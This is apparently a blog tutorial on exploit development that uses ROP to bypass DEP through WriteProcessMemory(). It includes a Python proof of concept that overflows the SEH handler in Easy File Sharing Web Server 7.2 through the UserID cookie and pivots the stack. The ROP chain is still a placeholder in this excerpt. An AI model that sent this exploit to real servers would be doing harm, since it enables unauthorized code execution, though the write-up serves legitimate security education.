---
title:  "(UNDER CONSTRUCTION) Exploit Development: Playing ROP'em COP'em Robots with WriteProcessMemory()"
date:   2020-07-11
tags: [posts]
excerpt: "Gaining code execution with WriteProcessMemory() via ROP and outlining the occasional need for Call-Oriented Programming."
---
Introduction
---
The other day on Twitter, I received a very kind and flattering [message](https://twitter.com/duff22b/status/1282014844338597888?s=20) about a previous [post](https://connormcgarr.github.io/ROP/) of mine on the topic of ROP. Thinking about this post, I recall utilizing `VirtualProtect()` and disabling ASLR system wide to bypass DEP. I also used an outdated debugger, Immunity Debugger at the time, and I wanted to expand on my previous work, with a little bit of a less documented ROP technique and WinDbg.

Why is ROP Important?
---
ROP/COP and other code reuse apparatuses are very important mitigation bypass techniques, due to their versatility. Binary exploit mitigations have come a long way since DEP. Notably, mitigations such as CFG, upcoming XFG, ACG, etc. have posed an increased threat to exploit writers as time has gone on. ROP _still_ has been the “swiss army knife” to keep binary exploits alive. ROP can result in arbitrary write and arbitrary read primitives- as we will see in the upcoming post. Additionally, data only attacks with the implementation of ACG have become crucial. It is possible to perform a data only attack, although expensive from a technical perspective, to write payloads fully in ROP.

What This Blog Assumes and What This Blog _ISN'T_
---
If you are interested in a remote bypass of ASLR and a 64-bit version of bypassing DEP, I suggest reading a [previous blog](https://connormcgarr.github.io/eko2019-exe) of mine on this topic (although, undoubtedly, there are better blogs on this subject).

This blog will not address ASLR or 64-bit exploitation- and will be utilizing non-ASLR compiled modules, as well as the x86 [stdcall](https://docs.microsoft.com/en-us/cpp/cpp/stdcall?view=vs-2019) calling convention (technically an "ASLR bypass", but in my opinion only information leak = a _true_ ASLR bypass).

Why are these topics not being addressed? This post aims to focus on a different, less documented approach to executing code with ROP. As such, I find it useful to use the most basic, straightforward example to hopefully help the reader fully understand a concept. I am _fully_ aware that it is 2020 and I am well aware mitigations such as CFG are more common. However, the last step in exploitation, no matter HOW many mitigations there are, is bypassing DEP (in user mode or kernel mode). This post aims to address the latter portion of the last sentiment- and expects the reader already has an ASLR bypass primitive and a way to pivot to the stack.

Expediting The Process
---

The application we will be going after is `Easy File Sharing Web Server 7.2`, which has a memory corruption vulnerability as a result of an HTTP request.

The offset to SEH is `2563` bytes. Instead of using a `pop <reg>` `pop <reg>` `ret` sequence, as is normally done on a 32-bit SEH exploit, an `add esp, <bytes>` instruction is used. This will take the stack, where it is currently not controlled by us, and change the address to an address on the stack that we control- and then return into it.

```python
import sys
import os
import socket
import struct

# 4063 byte SEH offset
# Stack pivot lands at padding buffer to SEH at offset 2563
crash = "\x90" * 2563

# Stack pivot lands here
# Beginning ROP chain
crash += struct.pack('<L', 0x90909090)

# 4063 total offset to SEH
crash += "\x41" * (4063-len(crash))

# SEH only- no nSEH because of DEP
# Stack pivot to return to buffer
crash += struct.pack('<L', 0x10022869)		# add esp, 0x1004 ; ret: ImageLoad.dll (non-ASLR enabled module)

# 5000 total bytes for crash
crash += "\x41" * (5000-len(crash))

# Replicating HTTP request to interact with the server
# UserID contains the vulnerability
http_request = "GET /changeuser.ghp HTTP/1.1\r\n"
http_request += "Host: 172.16.55.140\r\n"
http_request += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\r\n"
http_request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
http_request += "Accept-Language: en-US,en;q=0.5\r\n"
http_request += "Accept-Encoding: gzip, deflate\r\n"
http_request += "Referer: http://172.16.55.140/\r\n"
http_request += "Cookie: SESSIONID=9349; UserID=" + crash + "; PassWD=;\r\n"
http_request += "Connection: Close\r\n"
http_request += "Upgrade-Insecure-Requests: 1\r\n"

print "[+] Sending exploit..."
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.16.197.135", 80))
s.send(http_request)
s.close()
```

Set a breakpoint on the stack pivot of `add esp, 0x1004 ; ret` with the WinDbg command `bp 0x10022869`. After sending the exploit PoC- we will need to view the contents of the exception handler with the WinDbg command `!exchain`.

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM0.png" alt="">

As a breakpoint has already been set on the address inside of SEH, all that is needed to pass the exception is resuming execution with the `g` command in WinDbg. The breakpoint is hit, and we will step through the instruction of `add esp, 0x1004` to take control of the stack.

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM1.png" alt="">

As a point of contention, we have about 980 bytes to work with (as we will see, these 980 bytes will only be used for our first stage ROP/COP payload). Our payload will be stored in another location within the process memory.

The Call to `WriteProcessMemory()`
---

What is the goal of this method of bypassing DEP? The goal here is to not change permissions of memory to make it executable- but to instead take our shellcode to already executable memory.

Let's take a look at the call to `WriteProcessMemory()` firslty, to help make sense of all of this (per [Microsoft Docs](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory))

```c++
BOOL WriteProcessMemory(
  HANDLE  hProcess,
  LPVOID  lpBaseAddress,
  LPCVOID lpBuffer,
  SIZE_T  nSize,
  SIZE_T  *lpNumberOfBytesWritten
);
```
